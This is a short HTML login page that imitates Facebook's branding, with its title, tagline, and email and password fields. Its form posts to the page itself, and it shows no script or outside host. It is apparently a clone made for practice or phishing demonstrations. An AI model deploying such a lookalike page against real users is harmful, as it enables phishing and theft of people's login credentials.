<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login to Facebook</title>
  <link rel="stylesheet" href="static/style.css">
</head>
<body>
  <div id="login-container">
    <h2>Facebook</h2>
    <p>Facebook helps you connect and share with the people in your life.</p>
    <form id="login-form" method="post">
      <label for="email">Email address or phone number:</label>
      <input type="text" id="email" name="email" required>

      <label for="password">Password:</label>
      <input type="password" id="password" name="password" required>

      <button type="submit">Log in</button>
    </form>
    <a href="#" id="forgotten-password">Forgotten password?</a>
    <p id="create-account"><a href="#">Create new account</a></p>
    <p>Create a Page for a celebrity, brand, or business.</p>
  </div>
</body>
</html>
